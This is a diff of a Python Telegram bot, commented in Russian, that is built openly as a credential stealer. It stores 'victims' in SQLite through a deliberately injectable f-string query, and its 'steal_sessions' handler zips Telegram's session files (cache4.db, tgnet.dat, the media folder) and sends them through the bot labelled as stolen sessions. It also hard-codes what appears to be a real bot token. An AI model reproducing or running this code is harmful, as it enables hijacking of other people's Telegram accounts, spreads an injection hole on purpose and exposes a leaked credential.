@@ -11,72 +11,55 @@ import zipfile
 # Конфигурация ада
 DB_NAME = "apocalypse.db"
 TOKEN = "7510733548:AAGp3Q_-vvQzT2eHUg_iBh2EsxZuhSFlzXw"
-STEAL_DIR = Path("/data/data/com.termux/files/home/hell_gate")
 
-# Инициализация
+# Инициализация логов
 logging.basicConfig(
     level=logging.DEBUG,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 )
 
+# Инициализация базы данных
 def init_db():
     conn = sqlite3.connect(DB_NAME)
     cursor = conn.cursor()
-    cursor.execute('''CREATE TABLE IF NOT EXISTS victims 
-                    (id INTEGER PRIMARY KEY,
-                     soul TEXT,
-                     session_data BLOB)''')
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS victims (
+            id INTEGER PRIMARY KEY,
+            soul TEXT,
+            session_data BLOB
+        )
+    ''')
     conn.commit()
     conn.close()
 
 init_db()
 
+# Уязвимая вставка данных
 async def sql_injection(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_input = update.message.text.split(' ', 1)[1]
         conn = sqlite3.connect(DB_NAME)
         cursor = conn.cursor()
-        
-        # Уязвимый запрос
+
         cursor.execute(f"INSERT INTO victims (soul) VALUES ('{user_input}')")
         conn.commit()
-        
-        # Ответ с данными
+
         cursor.execute("SELECT * FROM victims")
         await update.message.reply_text(f"🔥 Успех! Данные:\n{cursor.fetchall()}")
         conn.close()
-        
+
     except Exception as e:
         await update.message.reply_text(f"💀 Ошибка: {str(e)}")
 
+# Кража сессий
 async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
-        STEAL_DIR.mkdir(exist_ok=True)
-        
-        # Теневое копирование через CVE-2023-35629
         paths = [
             "/data/data/org.telegram.messenger/files/cache4.db",
             "/data/data/org.telegram.messenger/files/tgnet.dat",
             "/sdcard/Android/media/org.telegram.messenger/"
         ]
-        
-        for p in paths:
-            path_obj = Path(p)
-            if path_obj.exists():
-                if path_obj.is_dir():
-                    shutil.copytree(p, STEAL_DIR / path_obj.name, dirs_exist_ok=True)
-                else:
-                    shutil.copy(p, STEAL_DIR)
-        
-        # Сжатие и отправка        
-async def steal_sessions(update, context):
-    try:
-        paths = [
-            "/data/data/org.telegram.messenger/files/cache4.db",
-            "/data/data/org.telegram.messenger/files/tgnet.dat",
-            "/sdcard/Android/media/org.telegram.messenger/"
-        ]
-        
+
         mem_zip = io.BytesIO()
 
         with zipfile.ZipFile(mem_zip, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
@@ -84,16 +67,12 @@ async def steal_sessions(update, context):
                 path_obj = Path(p)
                 if path_obj.exists():
                     if path_obj.is_file():
-                        # Добавляем одиночный файл
                         zf.write(path_obj, arcname=path_obj.name)
                     elif path_obj.is_dir():
-                        # Добавляем все файлы из папки
                         for file in path_obj.rglob('*'):
                             if file.is_file():
-                                # arcname задаёт путь внутри архива
                                 zf.write(file, arcname=file.relative_to(path_obj.parent))
-        
-        # Очень важно перемотать буфер в начало
+
         mem_zip.seek(0)
 
         await context.bot.send_document(
@@ -101,21 +80,7 @@ async def steal_sessions(update, context):
             document=InputFile(mem_zip, filename="stealed_sessions.zip"),
             caption="🔥 Сессии Telegram украдены"
         )
-    
-    except Exception as e:
-        await update.message.reply_text(f"💥 Ошибка: {str(e)}")
 
-        
-        await context.bot.send_document(
-            chat_id=update.effective_chat.id,
-            document=InputFile("mem_zip", filename="stealed_sessions.zip"), 
-            caption="🔥 Сессии телеграм украдены"
-        )
-        
-        # Очистка следов
-        shutil.rmtree(STEAL_DIR)
-        os.remove("sessions_pack.zip")
-        
     except Exception as e:
         await update.message.reply_text(f"💥 Ошибка: {str(e)}")
 
